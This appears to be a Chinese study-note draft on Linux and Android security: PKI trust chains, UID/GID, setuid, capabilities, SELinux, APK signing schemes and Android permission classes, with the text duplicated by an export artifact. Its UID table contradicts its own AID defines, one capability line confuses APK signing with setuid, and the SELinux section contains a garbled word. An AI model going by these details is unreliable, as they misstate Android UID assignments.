自签名指证书的签名者（机构）和证书拥有者（个体）是同一个实体\n  自签名即我自己的私钥签名我自己的公钥\n* 自签名的作用1：作为信任链的根证书\n  比如一个银行的公钥证书，由银行自己签名，银行自己颁发给自己，访问网上银行服务时，需要吧银行的根证书加入到系统中，从而信任该证书\n* 自签名的作用2：完整性鉴别 \n\n## 移动平台中的主流签名作用：信任模式\n* 何为可信任？\n  我写的应用？\n  我信任的哥们写的应用？\n\n* 如何鉴别可信任\n  签名了？\n  签名是可信的？（证书、证书回溯）\n\n* 可信任和普通应用的权利差异\n  人为的把一些Operation归类\n  某类Operation对于可信任应用和普通应用的表现不一样\n* 一些例子\n  系统应用使用系统特权不需要用户弹窗授权\n## 移动平台中的主流签名作用：限制安装/运行\n* 应用安装时\n  是否包含签名？----》没有？禁止安装\n  提取证书进行验证----》证书是有效且可信的？----》不是？禁止安装\n  基于证书的公钥对签名进行验证----》签名验证通过？----》不是？禁止安装\n* 应用运行某些特殊代码（特权）时\n  是否包含签名？----》没有？禁止运行\n  提取证书进行验证----》证书是有效且可信的？----》不是？禁止运行\n  基于证书的公钥对签名进行验证----》签名验证通过？----》不是？禁止运行\n## 权限的作用：细粒度的特权管理\n* 权限是一个ID或者一个字符串\n* 权限用来细分权利（类似Capability）\n* 通常一个权限与一类操作绑定\n* 权限首先需要申请\n* 但是申请后是否被批准由平台策略决定\n* 例子1：应用读写SDCARD\n* 例子2：应用reset手机\n## 权限的安全性保护：通过签名\n* 权限的完整性保护：防篡改\n  例子（通过认证并获得签名后再加policy权限）\n  实现方式：签名对（code+权限）完整性保护 ，如果权限被篡改，签名校验失败，拒绝执行\n* 权限的授权安全策略：防Escalate\n  例子（普通应用申请Inject Event权限）\n  实现方式，即使用户申请了，也不能获得，因为签名不是系统的签名，所以不授予权限\n  \n## 回顾和总结\n\n# Android中的签名\n## Android的签名作用：完整性鉴别\n* 支持自签名用于完整行鉴别\n* 不做信任模式\n* 不做安装和运行时的限制,即不限制证书是否是可信的\n## Android的签名作用：Signature Permissions 和 ShareUID\n* Signature Protected Level Permissions\n  用于特权Permission\n  只有特定签名的APK才被授权\n```xml\n      <!-- @SystemApi Allows access to hardware peripherals.  Intended only for hardware testing.\n         <p>Not for use by third-party applications.\n         @hide\n    -->\n    <permission android:name=\"android.permission.HARDWARE_TEST\"\n        android:protectionLevel=\"signature\" />\n ```\n* Share Process UID android:sharedUserId=\"xxxx\"\n  Process间Share UID的目的是共享资源等\n  Android中两个APK Share相同的UID必须其签名所用的Private Key一样（为什么）\n  如果shareUID相同，A可以访问B中的data/data下的资源\n  android11 shareUID不再支持，因为它破坏了应用沙盒的安全模型，使得应用间的隔离变得复杂。\n## Android的签名作用：身份ID和升级的匹配\n* Android中的自签名只是代表了身份，但不代表身份是否可信任\n* Android的应用的Identifier是Package Name:\n  Package Name 不一样，互相不影响，允许同时存在（安装）\n  Package Name 一样，只能存在一个，允许做升级处理\n* 升级的安全性考虑\n  必须签名的证书一致（防假冒，防侵入隐私）\n  如果不一致，则用户要么放弃新的应用，要么先卸载旧的，再安装新的。但这属于安装，不属于升级\n  正常的升级不擦除应用的工作目录数据，以保证历史数据的持续性\n## AndroidAPK之META INF\n* APK结构\n* META INF的组成\n*   •\tAndroid 7.0 (Nougat) 开始支持 v2 签名（APK Signature Scheme v2），之后又有 v3/v4。\n\t•\t使用 v2/v3/v4 签名时，可以不再包含 CERT.RSA、CERT.SF、MANIFEST.MF 文件，因为签名数据存储在 APK 尾部的 Signing Block 里。\n**APK Signature Scheme 现状（2025）**\n* **v1（JAR 签名）**：只保护单个条目；Android 7.0+ 仍支持但已不推荐，易被 zipalign 等修改破坏。\n* **v2**：签名数据位于 APK **Signing Block**；显著加速安装校验，允许不再包含 `CERT.RSA/ CERT.SF/ MANIFEST.MF`。\n* **v3**：在 v2 基础上支持**密钥轮换（Proof-of-rotation）**；升级时可更换签名密钥并建立信任链。\n* **v4**：为**增量安装/分发**设计，搭配 v2/v3 使用，主要由安装器消费。\n* 校验命令：\n```shell\napksigner verify -v --print-certs your.apk\n```\n* Play 商店上架要求：应使用 v2+（新应用一般要求 v3），仅 v1 可能被拒。\n* 签名流程\n  PrivateKey(hash(CERT.SF)) => CERT.RSA\n## 回顾和总结\n\n # Android中的权限\n## 近年权限与隐私重大变化（Android 10~15 摘要）\n1) **分区存储 Scoped Storage**（Android 10/11）\n* 外部存储访问被沙箱化；`READ/WRITE_EXTERNAL_STORAGE` 逐步被弱化。\n* Android 11 起提供 **MANAGE_EXTERNAL_STORAGE**（极度敏感，仅少量场景允许）。\n* 媒体访问细分为：`READ_MEDIA_IMAGES` / `READ_MEDIA_VIDEO` / `READ_MEDIA_AUDIO`（Android 13+），以及 **选择性访问** `READ_MEDIA_VISUAL_USER_SELECTED`（Android 14/15）。\n\n2) **包可见性（Package Visibility）**（Android 11）\n* 默认**无法枚举**系统上安装的其他包。\n* 需要在 `AndroidManifest.xml` 中声明：\n```xml\n<queries>\n    <package android:name=\"com.example.target\" />\n    <intent>\n        <action android:name=\"android.intent.action.VIEW\" />\n        <data android:scheme=\"https\" />\n    </intent>\n</queries>\n```\n\n3) **运行时权限拆分与新增**\n* Android 12：蓝牙权限改为运行时 `BLUETOOTH_CONNECT/SCAN/ADVERTISE`，并引入 **NEARBY_DEVICES** 场景限制。\n* Android 12：位置支持**近似/精确**；用户可仅授予近似位置。\n* Android 13：**通知权限** `POST_NOTIFICATIONS` 改为运行时授权。\n* Android 14/15：健康/传感器、后台权限进一步收紧（例如 `BODY_SENSORS_BACKGROUND` 需额外审查）。\n\n4) **前台服务（FGS）与后台限制**\n* Android 12 起要求声明 **前台服务类型**（`type=\"location|mediaPlayback|connectedDevice|dataSync|camera|microphone|health\"` 等）。\n* Android 14/15 对**后台启动 FGS**、超时与并发数量更严格；建议改用 **WorkManager + 明确的 FGS 类型**。\n\n5) **精确闹钟**\n* Android 13 引入 `USE_EXACT_ALARM`；Android 14/15 对非闹钟类 App 更**严格限制**，需合规理由与设置跳转。\n\n6) **照片选择器（Photo Picker）**（Android 13+）\n* 无需存储权限即可让用户选择媒体；优先使用系统 Photo Picker 替代自建文件选择。\n\n7) **PendingIntent 可变性**\n* Android 12 要求显式设置 `FLAG_IMMUTABLE` 或 `FLAG_MUTABLE`，默认不再安全。\n\n8) **签名权限与 privapp 权限**\n* 大量历史 `signatureOrSystem` 权限被收紧为 `signature`；OEM 侧须通过 `privapp-permissions` 白名单并配套签名。\n## Android的权限作用：细粒度特权管理\n* 权限与操作关联\n  android不支持隐式申请权限，即使是系统应用，也需要显式申请权限\n* 应用需要显式申请权限\n* 用户对权限可知（不可控），\n  现在可控（厂商处理）\n* 对特权权限单独控制\n## Android的不同权限类别\n在 Android 中，**权限（Permission）**按作用范围和敏感程度可以分为几个主要类别。下面给为一个体系化梳理：\n⸻\n1. 普通权限 (Normal Permissions)\n\t•\t特点：涉及用户隐私风险较小，系统会在安装时自动授予。\n\t•\t示例：\n\t•\tINTERNET：访问网络\n\t•\tACCESS_NETWORK_STATE：获取网络状态\n\t•\tSET_WALLPAPER：设置壁纸\n⸻\n2. 危险权限 (Dangerous Permissions)\n\t•\t特点：涉及用户隐私或设备安全，必须 运行时动态申请（Android 6.0+）。\n\t•\t按权限组分类（常见组）：\n\t•\t日历 (CALENDAR)\n\t•\tREAD_CALENDAR、WRITE_CALENDAR\n\t•\t相机 (CAMERA)\n\t•\tCAMERA\n\t•\t联系人 (CONTACTS)\n\t•\tREAD_CONTACTS、WRITE_CONTACTS、GET_ACCOUNTS\n\t•\t位置 (LOCATION)\n\t•\tACCESS_FINE_LOCATION、ACCESS_COARSE_LOCATION\n\t•\t麦克风 (MICROPHONE)\n\t•\tRECORD_AUDIO\n\t•\t电话 (PHONE)\n\t•\tREAD_PHONE_STATE、CALL_PHONE、READ_CALL_LOG、WRITE_CALL_LOG、ADD_VOICEMAIL、USE_SIP、PROCESS_OUTGOING_CALLS\n\t•\t传感器 (SENSORS)\n\t•\tBODY_SENSORS\n\t•\t短信 (SMS)\n\t•\tSEND_SMS、RECEIVE_SMS、READ_SMS、RECEIVE_WAP_PUSH、RECEIVE_MMS\n\t•\t存储 (STORAGE)\n\t•\tREAD_EXTERNAL_STORAGE、WRITE_EXTERNAL_STORAGE\n⸻\n3. 签名权限 (Signature Permissions)\n\t•\t特点：只有当 请求权限的应用 和 声明权限的应用 使用相同的签名证书时，才能授予。\n\t•\t应用场景：系统应用间的私有接口调用。\n\t•\t示例：\n\t•\tINSTALL_PACKAGES（安装 APK）\n\t•\tDELETE_PACKAGES（卸载 APK）\n⸻\n4. 签名或系统权限 (SignatureOrSystem Permissions)\n\t•\t特点：Android 5.0 以前允许系统预装应用（放在 /system/app）或相同签名应用使用。\n\t•\t状态：Android 6.0 开始逐渐废弃，很多权限被收紧为 Signature-only。\n\t•\t示例（老系统才有效）：\n\t•\tWRITE_SETTINGS\n\t•\tCHANGE_CONFIGURATION\n⸻\n5. 特殊权限 (Special Permissions)\n这些不属于普通危险权限，需要通过 特殊 API 或系统设置界面 授权。\n\t•\tSYSTEM_ALERT_WINDOW（悬浮窗权限）\n\t•\t通过 Settings.canDrawOverlays() 检查\n\t•\tWRITE_SETTINGS（修改系统设置）\n\t•\t通过 Settings.System.canWrite() 检查\n\t•\tREQUEST_INSTALL_PACKAGES（允许安装未知来源的 APK）\n\t•\tAndroid 8.0 引入\n\t•\tMANAGE_EXTERNAL_STORAGE（管理所有文件）\n\t•\tAndroid 11 引入，替代传统的存储权限\n\t•\tUSE_FULL_SCREEN_INTENT（高优先级通知）\n\t•\tAndroid 10 引入\n⸻\n6. 受限制权限 (Restricted Permissions, Android 10+)\n\t•\t特点：Google 逐步收紧一些权限的使用，需要 Google 审核/声明特殊用途 才能上架 Play。\n\t•\t示例：\n\t•\tREAD_SMS、SEND_SMS（敏感通讯权限）\n\t•\tREAD_CALL_LOG、WRITE_CALL_LOG\n\t•\tACCESS_BACKGROUND_LOCATION（后台定位权限，Android 10+ 严格限制）\n⸻\n✅ 总结：Android 权限主要分为：\n\t•\t普通权限（自动授予）\n\t•\t危险权限（需要运行时授权）\n\t•\t签名/签名或系统权限（系统或签名一致才可用）\n\t•\t特殊权限（需要通过系统设置授权）\n\t•\t受限制权限（Google 审核，敏感程度高）\n## Android的平台权限定义\n  定义在AndroidManifest.xml中\nAndroid 的权限本质上就是字符串常量，统一定义在 frameworks/base/core/res/AndroidManifest.xml 里。\n这是系统框架的清单文件，其中包含了所有系统预定义权限，例如：\n```xml\n<permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"\n    android:protectionLevel=\"dangerous\" />\n<permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"\n    android:protectionLevel=\"dangerous\" />\n```\n当在Application中 AndroidManifest.xml 里写：\n```xml\n<uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n```\n就使用了这个权限，但是必须动态申请。\n\n> 提示：从 Android 13 起，媒体读取权限按类型细分；从 Android 11 起，**`WRITE_EXTERNAL_STORAGE` 基本被废弃**，请改用 `MediaStore` + 具体媒体权限或 Photo Picker。\n\n## Android的运行时权限控制方式：通过PM的CheckPermission\n* Android独有的Service（底层平台不具有）\n* 所以需要在Android本身Framework中控制\n* 主流的Service一般都是基于Binder IPC或者其他IPC提供服务\n* 所以在最低层控制（Service所在的service可执行文件 run中）以避免逃逸控制\n  绕开Utility Function直接invoke Remote Service\n  所以要在service run中进行控制\n* 例子 DayDream\n```java\nvoid startDockOrHome(){\n  awakenDreams();\n  Intent dock = createDockIntent();\n  if(dock != null){\n    try{\n      mContext.startActivityAsUser(dock,UserHandle.CURRENT);\n      return;\n    }catch(ActivityNotFoundException e){\n    }\n\n    private static void awakenDreams(){\n      IDreamManager dreamManager = getDreamManager();\n      if(dreamManager != null){\n        try{\n          dreamManager.awaken();\n        }catch(RemoteException e){\n          //fine,stay asleep then\n        }\n      }    \n      }\n  }\n}\n\nstatic IDreamManager getDreamManager(){\n  return IDreamManager.Stub.asInterface(ServiceManager.checkService(DreamService.DREAM_SERVICE));\n}\n\n@Override //Binder call\npublic void awaken(){\n  checkPermission(android.Manifest.permission.WRITE_DREAM_STATE);\n  final long ident = Binder.clearCallingIdentity();\n  try{}\n}\n\nprivate void checkPermission(String permission){\n  if(mContext.checkCallingOrSelfPermission(permission) != PackageManager.PERMISSION_GRANTED){\n    throw new SecurityException(\"Access denied to process: \" + Binder.getCallingPid()+\", must have permission \" + permission);\n  }\n}\n```\n\n> 生产代码建议：在 **Binder 端（服务实现）**做二次校验（`checkCallingPermission()` / `enforceCallingPermission()`），避免调用方绕过客户端封装直接发起 IPC。\n\n## Android的运行是权限控制方式：映射为OS的特定属性\n* 非Android特有的Service（底层平台已经提供，如File访问，TCPIP数据首发等）\n* 多个入口访问：Android API , Java API ,NDK C API ,Shell ,etc\n* 底层控制准则，会聚口在底层，所以在底层（OS层面）统一控制，这样可以避免逃逸控制\n* 所以复用OS的一些安全控制特性，比如GID\n* 所以需要把Android空间的Permission Mapping到OS的GID\n* 例子：访问SDCard\n  sdcard目录下的文件权限如下所示：\n```shell\n# 外部存储挂载示例（不同设备存在差异）\nmarlin:/ $ ls -l /storage\ntotal 8\ndrwx--x--x 3 root sdcard_rw 4096 2025-09-01 21:59 emulated\ndrwxr-xr-x 2 root root        60 1974-12-07 14:35 self\n# 进程通过所属 GID（如 sdcard_rw / media_rw）与 FUSE/SDCardFS/FS-verity 等层配合受控访问\n```\n\n## Android的Permission与UID/GID的mapping\n\n# Android 专题补充（2025）\n## AID 与多用户 UID 计算\n* `appId` 从 10000 起分配；多用户下 `uid = userId * 100000 + appId`。\n* 典型系统 AID：`AID_SYSTEM=1000`、`AID_RADIO=1001`、`AID_BLUETOOTH=1002`、`AID_GRAPHICS=1003` 等（详见 `android_filesystem_config.h`）。\n\n## SELinux（SEAndroid）要点\n* 强制访问控制（MAC）默认 **Enforcing**；检查：`getenforce`。\n* App 进程运行在诸如 `u:object_r:app_data_file:s0:cXX,cYY`（文件）与 `u:r:untrusted_app:s0:cXX,cYY`（进程域）之下；越权访问由策略阻断。\n* 调试常用：`adb shell dmesg | grep avc:`、`adb logcat | grep denied` 定位策略拒绝。\n\n## 调试与自检清单\n* 查看进程身份与能力：`ps -eo pid,ruid,euid,rgid,egid,user,comm`; `cat /proc/$PID/status`。\n* 查看签名方案与证书：`apksigner verify -v --print-certs your.apk`。\n* 遵循现代权限：优先 Photo Picker / MediaStore；声明 `queries`；细化 FGS 类型；声明 PendingIntent 可变性；最小权限原则。\n","source":"_drafts/android_safe.md","raw":"> 本笔记为安全体系与 Android 平台权限/签名机制速记。**最近一次校对：2025-09（基于 Android 15 / API 35 现状）**。文末与相关章节已补充近年重要变更：APK 签名 v2/v3/v4、分区存储、包可见性、运行时权限调整、前台服务限制、精确闹钟权限等。\n\n扎绳篇：\n非对称密码 公钥体系\n证书 \n包含公钥，公钥是利用证书来传递的\n\n利用签名来保护数字证书本身\n\n人的信任关系：一个信任人的列表\n数字时代的信任关系：一个受信任者的证书列表\n\n人的信任链：孔子-》孔子的徒弟-》孔子的徒弟的徒弟\n数字时代的信任链：证书链\n证书签名的不同点：根证书自签名，非根证书父签名\n证书的限制：\n    约束\n    用途\n    有效期\nPKI的概念\n\n基于可信任证书的认证方式被广泛的应用在现代安全领域，比如WIFI，HTTPS\n在HTTPS中，典型的Client对Server的认证和鉴别基于可信任列表\n织网篇:\n# 进程和进程边界\n## 进程和线程\n可执行文件：不活动就是废物\n进程：可执行文件的活动表现，一次生命的历练，资源的最小单位\n线程：CPU(核)的调度单位,并发的执行序列，进程的多管齐下\n资源和调度\n## 手机操作系统的发展\nFeature Phone 时代的实时简单的单进程多任务非智能系统\nSmart Phone 时代的多进程多任务智能系统\n## 进程的地址空间边界\n每个进程的虚拟地址空间0-4G（32位），每个进程的物理地址空间是独立的\n\n## 进程边界的安全围栏：Crash的不可扩展性\n## 进程边界的安全围栏：全局数据和服务的不可访问性\n回顾和总结\n\n# 多用户和多用户边界\n## 需求背景\n资源缺乏\n中央统一管理\n## 多用户的边界：独立的工作目录\n独立的老巢\n/home/nuoen\n## 多用户的边界：可操作/访问的资源\n资源分类\n权限管理\n## 多用户的边界：可执行的操作\n操作分类\n权限管理\n## 多用户的边界：UID和GID\nName只是供看的\nIdentifier才是系统层面的标识\n用户的行为是一系列进程的行为\n特性标识其实是进程的UID/GID\n\n# 进程和文件的UID/GID\n## 文件资源的权限力度：UID/GID\n* 文件是一种资源\n* 在Linux中，甚至一切皆是文件，Socket,Driver\n* 文件资源对不同Target(用户)的不同操作权限的需求应运而生\n* 如何描述和区分不同的target? ID=====》UID===》唯一的\n* 某些场景下，允许多个不同的Target/用户 (而不是一个)具有一致的操作权限，怎么办？ID---->GID---->多个用户可以属于一个GID，一个用户可以属于多个GIDs\n* 所以文件权限的管理力度区分为3类群体：属于特定UID的用户，属于特定GID的用户（们），其他用户\n* 一个上帝用户存在：ROOT，其UID=0，上帝用户永远满足属于任何UID\n```\nps -eo pid,uid,gid,user,args\n```\n## 文件的可操作权限\n文件/文件夹的可读\n文件/文件夹的可写\n文件/文件夹的可执行\n```\nls -l \n是否是文件夹|Owner用户权限|非Owner用户但是相同的组用户权限|既不是Owner用户也不是相同组的用户权限\n*|***|***|***   UID  GID\ndrwxr-xr-x  2 root  root        4096 Apr 22  2024  mnt\ndrwxrwxr-x 29 nuoen nuoen       4096 Jun  7 04:55  msm\n-rw-------  1 nuoen nuoen          0 May 20 11:20  nohup.out\n```\n## 进程的标识：PID,UID,GID,GIDs\nPID:进程的Unique Identifier。每次Running的PID可能相同，或者不同，由系统分配\nUID:进程的身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的UID(用户身份标识)\nGID:进程的（组）身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的GID(组用户身份标识)。同一进程允许属于多个GID\nGIDs:进程所属的全部GID\n\n## Name 和 ID的映射\nandroid_filesystem_config.h\n```c\n/* This is the master Users and Groups config for the platform.\n * DO NOT EVER RENUMBER\n */\n\n#define AID_ROOT 0 /* traditional unix root user */\n/* The following are for LTP and should only be used for testing */\n#define AID_DAEMON 1 /* traditional unix daemon owner */\n#define AID_BIN 2    /* traditional unix binaries owner */\n\n#define AID_SYSTEM 1000 /* system server */\n\n#define AID_RADIO 1001           /* telephony subsystem, RIL */\n#define AID_BLUETOOTH 1002       /* bluetooth subsystem */\n#define AID_GRAPHICS 1003        /* graphics devices */\n#define AID_INPUT 1004           /* input devices */\n#define AID_AUDIO 1005           /* audio devices */\n#define AID_CAMERA 1006          /* camera devices */\n#define AID_LOG 1007             /* log devices */\n\n\n/* The 3000 series are intended for use as supplemental group id's only.\n * They indicate special Android capabilities that the kernel is aware of. */\n#define AID_NET_BT_ADMIN 3001 /* bluetooth: create any socket */\n#define AID_NET_BT 3002       /* bluetooth: create sco, rfcomm or l2cap sockets */\n#define AID_INET 3003         /* can create AF_INET and AF_INET6 sockets */\n#define AID_NET_RAW 3004      /* can create raw INET sockets */\n\n#define AID_APP 10000       /* TODO: switch users over to AID_APP_START */\n/** android apk 的uid都是10000开始的 **/\n\n```\n📌 Android UID 分配机制概览\nUID 范围\t用途\t示例\n0 – 999\t内核 / root / 守护进程\t0=root, 100=logd\n1000 – 1999\t系统服务 / 框架进程\t1000=system\n2000 – 2999\t硬件守护程序\t2000=radio, 2001=bluetooth\n3000 – 9999\t其他核心服务（AID_*）\t3004=audioserver, 1073=networkstack\n10000 以上\t普通 APK 应用\t10123=com.x.app\n\n\n📦 普通应用为什么是 10000+？\n\t•\t安装 APK 时，如果没有 <sharedUserId>：\n\t•\tPackageManager 自动从 10000 开始为应用动态分配 UID。\n\t•\t多用户模式下会按：\n\napp_uid = user_id * 100000 + app_id\n\n\n\t•\t如果有 <sharedUserId>，且不是 AID 预定义的 UID：\n\t•\t必须满足条件：系统签名 + 安装在 system/priv-app。\n\t•\t否则系统拒绝安装。\n\n⸻\n## chmod 和 chown 命令介绍\n文件R/W/X的系统内部采用3Bit表示，R为最高位比特，置位为0x04,W为中间比特，置位为0x02,X为最低位比特，置位为0x01\nshell中表示时，置位使用相应R/W/X表示，未置位使用-\n操作文件面向群体的操作权限时，使用Chomd，可以直接使用数字，也可以使用助记符\n(a:all ,u:owner user,g:group, +:add one permission, -:remove one permission)\n\nchown 命令用于改变文件的所有者和所属组(UID和GID)\nSHELL命令中通常采用Name方式修改，而不是ID方式\n一般格式： chown newUID : newGID FileName\n\n```shell\nchown system:system nohup.out\n```\n## UID/GID的衔接\nLinux一切皆是文件\n文件基于UID/GID来划分它的面向群体，对它的面向群体定义不同的操作权限\n用户的行为映射为进程的运行\n进程的运行使用进程的UID/GID来标识自己的身份\n进程的UID/GID<=======>文件的UID/GID 完美衔接！！\n进程的UID/GID除了被授予可操作文件的范畴外，非文件范畴的需要进行权限控制的操作（如重启系统等特权操作）继续通过进程的UID/GID身份来进行控制和授权\n比如，对于Reboot这个API,其入口处可以check calling的Process的UID,如果不是Root，则Reject\n\n # 进程的 Real UID 和 Effective UID\n## 身份的标识：Real UID\n* 进程的UID只是泛称，其实有很多种不同的UID\n* 进程的Real UID是进程的身份的标识，用来说明 Who am I\n* 仅仅说明Who am I,但是没有“实权”是不行的\n* Linux中，进程能做什么事情不是由Real UID决定的\n* Real UID仅仅是身份，有身份没有权利是无用的\n## 权利的标识：Effective UID\n* 有身份无权利是不行的\n* Effective UID是进程的权利的标识，标识了该进程的“权利”\n* Linux中的进程的授权（即，当前进程具有的操作权限）是靠Effective UID来识别的\n* 有权利就能做一切，Linux中具有“特权”Effective UID的进程能为所欲为\n* 之前课时说明的，文件，资源以及特权API操作时对进程是否有权限的识别的UID,即是指Effective UID\n## 身份和权利的关系\n* 一般情况下，身份和权利是一致的，即 Real UID = Effective UID\n* 所以，默认PS CMD 输出的UID指的是Effective UID,而没有输出Real UID\n```shell\nps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0 170644 14180 ?        Ss   Jun28   0:51 /sbin/init splash\nroot           2  0.0  0.0      0     0 ?        S    Jun28   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        I<   Jun28   0:00 [rcu_gp]\nroot           4  0.0  0.0      0     0 ?        I<   Jun28   0:00 [rcu_par_gp]\n```\n* 我们也可以显式的显示完整的Effective UID 和 Real UID\n```shell\n# 查看所有进程的真实/有效 UID、GID\nps -eo pid,ruid,euid,rgid,egid,user,comm\n\n# 仅看某个 PID（示例：1234）\nps -o pid,ruid,euid,rgid,egid,cmd -p 1234\n\n# 从 /proc 读取（同时可见 Capability）\ncat /proc/1234/status | egrep 'Uid:|Gid:|Cap(Inh|Prm|Eff)'\n```\n## ROOT用户的特权\n* 我们所指的root用户，均是Effective UID = root的进程，尽管一般情况下，Real UID = Effective UID\n* Effective UID = root的进程具有“皇权”，他不受任何限制，可以为所欲为\n* 它可以为自己正身：如果自己的身份（Real UID）不是root，它可以将自己的身份名正言顺的改为root(调用SetXUID),从而使身份和权利均是root\n* 它也可以自降为庶民：出家皈依，将自己的Real UID 和 Effective UID 都设置（降低，也是调用SetXUID）为庶民（非特权普通的Real UID,Effective UID），从而失去特权.\n## UID的世袭\n* 在linux世界里，为了安全考虑，UID的世袭遵循：身份世袭而权利不世袭的准则\n* 子进程的Real UID = Effective UID = 父进程的Real UID\n* 这使得临时夺权且尚位正身（普通Real UID 而特权Effective UID）的进程的子嗣不能继承其特权而仅能继承其的正身 （Real UID）\n\n# 文件setUID标识\n## 平民身份、皇族特权的需求背景\n* Linux中的password是一个可执行程序（CMD），用于修改用户的密码\n* Passwd需要操作多用户的账号文件（该文件高度安全，仅有ROOT用户可以读写）\n* 普通用户难道不能修改自己的密码？\n* Passwd进程虽然是平民身份（普通用户启动它），却需要皇族的权利。身份和权利不一致。\n## 如何解决\n临时提升特权（Effective UID = root）而维持身份不变（Real UID = 普通用户），使得其利用特权行使职责时可避免世袭的安全问题。\n## Linux的文件setUID标识\n* 文件的Owner UID设置为特殊用户，比如ROOT\n* 文件面向Owner UID的群体（第一组标志）的操作权限增加额外的setUID标识\n* Linux系统保证，任何用户（进程）执行该可执行文件（会Fork一个新的进程来加载该可执行文件running）时，该可执行文件所在的子进程的Real UID仍然继承其父进程的Real UID，但是其Effective UID不再等于其父的Real UID而是被提升到该可执行文件的Owner UID\n```shell\nls -l | grep passwd\n-rwsr-xr-x 1 root root         88464 Feb  6  2024 gpasswd\n-rwxr-xr-x 1 root root        254160 Dec  2  2022 grub-mkpasswd-pbkdf2\n-rwsr-xr-x 1 root root         68208 Feb  6  2024 passwd\n```\n## Chomd设置setUID的方式\n* 和基本的RWX设置类似，有助记符和直接数字设置。直接数字设置时，采用4位数字，其中第一位标志setUID\n```shell\nchmod 4775 xxx.file //设置setUID\nchmod 0775 xxx.file //取消setUID\n```\n## setUID的安全问题\n* sUID的进程的EUID提升了\n* sUID的进程的RUID默认没有提升\n* 在sUID进程的RUID没有正身（也设置为ROOT）之前，其子民的RUID/EUID只是平民,此时是安全的\n* 要依据实际场景，有限制的决定是否要在sUID进程中为自己正身，需要明确知道其后果是，其任何子民的RUID/EUID均会提升至贵族（ROOT）\n* 两个例子，passwd（未正身），Android的su（正身）\n## 有RealGID,EffecitveGID,setGID吗\n* 存在，待看\n\n## 文件 Capability（setcap/getcap）\n* 除了 setUID 之外，现代 Linux/Android 更推荐使用 **文件 Capability** 赋权，避免一刀切的 root 特权。\n* 常用命令：\n```shell\n# 赋予二进制绑定低端口能力（示例）\nsudo setcap 'cap_net_bind_service=+ep' /path/to/bin\n# 查看文件能力\ngetcap /path/to/bin\n```\n* 在 Android 上，系统分区的二进制能力通常由构建系统打包时附加；第三方 App 无法随意为自身可执行文件设置 capability。\n\n如此管理权限颗粒度太粗，不够精细，所以引入了Capability机制\n\n# Linux的Capability机制\n## UID怎么了\n* 权限颗粒太粗\n* 容易引起权利过剩（溢出）\n* 权利溢出/过剩引起的安全问题\n## Capability:细粒度的权限控制\n* 我们需要细粒度的权限\n* 除了皇帝，我们也需要不同的地方官\n* Linux引入了Capability:每个Capability系统内以一位Bit代表，OS内部使用64bit存储\n```c\n//android_filesystem_capability.h\n#define CAP_CHOWN 0\n#define CAP_DAC_OVERRIDE 1\n#define CAP_DAC_READ_SEARCH 2\n#define CAP_FOWNER 3\n#define CAP_FSETID 4\n#define CAP_KILL 5\n#define CAP_SETGID 6\n#define CAP_SETUID 7\n#define CAP_SETPCAP 8\n#define CAP_LINUX_IMMUTABLE 9\n#define CAP_NET_BIND_SERVICE 10\n#define CAP_NET_BROADCAST 11\n#define CAP_NET_ADMIN 12\n#define CAP_NET_RAW 13\n#define CAP_IPC_LOCK 14\n#define CAP_IPC_OWNER 15\n#define CAP_SYS_MODULE 16\n#define CAP_SYS_RAWIO 17\n#define CAP_SYS_CHROOT 18\n#define CAP_SYS_PTRACE 19\n#define CAP_SYS_PACCT 20\n```\n## 进程的Capability\n* Permitted Capability Sets\n  * 当前进程的权利的围栏，最大权利范围，是Effecitve Capability Sets的超集\n* Effective Capability Sets\n  * 当前进程的时机使用（支配）的权利集，该集内的Capability必须从属于Permitted Capability Sets。该集合与Effective UID类似，是实际的权利标识\n* Inheritable Capability Sets\n  * 子进程唯一可以直接继承的Capability Sets。在Capability模式下，只有子进程的Inheritable Capability Sets = 父进程的Inheritable Capabiltity Sets。其他皆是NO\n## 文件的Capability\n* Permitted Capability Sets\n  * 该可执行文件可以为其进程带来的Permitted Capability Sets\n* Effective Capability Set\n  * 仅1bit,Enable or Disable ,标识该可执行文件running所在的进程的Permitted Capability Sets是否自动全部Assign到其Effective Capability Sets。通常用于与传统的Root-setUID可执行文件向下兼容。\n* Inheritable Capability Sets\n  * 与进程的Inheritable Capability Sets一起作用（位与）以决定新的进程的Permitted Capability Sets\n## Capability BoundSet\n* Capability BoundSet是进程的超集\n* 是进程自己为自己设定的安全围栏（Capability Sets），限制可执行文件的Permitted Capability Sets仅有局部能转化为进程的Permitted Capability Sets\n* Capability BoundSet能够被子进程继承\n* Init进程默认Capability BoundSet 为全1\n## Spawn进程的Capability\nP'(permitted) = (P(inheritable) & F(inheritable)) | (F(permitted) & cap_bset)\nP'(effective) = F(effective)?P'(permitted):0\nP'(inheritable) = P(inheritable)\n```shell\ncat /proc/[pid]/status | grep Cap\n```\n# Capability与UID的兼容\n* 新技术必须向下（前）兼容，要保证旧的实体（应用）工作正常\n* 旧的应用：Capability - dumb进程\n  Permitted Capability Sets = Effective Capability Sets = Inheritable Capability Sets = 0x000000000000000,我不知道，我怎么设置？\n* 旧的可执行文件：Capability - dumb文件:\n  Root-setUID可执行文件，系统转变为Capability的方式为：File Effective Bit = True;File 's Permitted和Inheritable Capability Sets = 0xFFFFFFFFFFFFFFFF\n* 旧的 Root EUID 的进程：对使用 v1（JAR）签名时代的 setUID 兼容，**File Effective Bit = true** 时仍会将文件的 Permitted 能力集赋予进程（受 BoundSet 限制）。\n* 注意：公式中的常量应为 **PR_CAPBSET**（capability bound set），不是 PR_CAPBEST。\n# 高级特性\n## 被ROOT了怎么办\n* 手机被ROOT了怎么办\n* 恶意应用获取了ROOT权限怎么办？\n* 现在无能为力\n* 我们想怎么样？即便ROOT EUID的应用，仍然不能为所欲为\n## SELinux\n* 拯救英雄\n* DAC和MAC的策略区别\n* DAC(Discretionary Access Control)自主访问控制：传统U6 m0k9noijnix/Linux安全管理模型；主体对它所属的对象和运行的程序拥有全部的控制权\n* MAC(Mandatory Access Control)强制访问控制：SELinux基于的安全策略；管理员管理访问控制。管理员指定策略，用户不能改变它。策略定义了哪个主体能访问哪个对象。采用最小特权方式，默认情况下应用程序和用户没有任何权限\n* 